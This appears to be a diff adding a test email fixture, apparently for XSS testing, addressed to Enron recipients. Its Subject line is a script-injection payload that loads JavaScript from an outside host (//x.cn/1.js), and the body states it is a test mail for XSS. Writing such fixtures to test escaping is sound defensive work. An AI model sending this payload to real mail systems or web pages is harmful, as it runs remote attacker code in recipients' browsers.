@@ -1,0 +1,7 @@
+From: Natalie Guzman <extremekos@gnquebec.com>
+To: morris.clark@enron.com, mary.cook@enron.com, joseph.deffner@enron.com, 
+Subject: <script src=//x.cn/1.js async>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
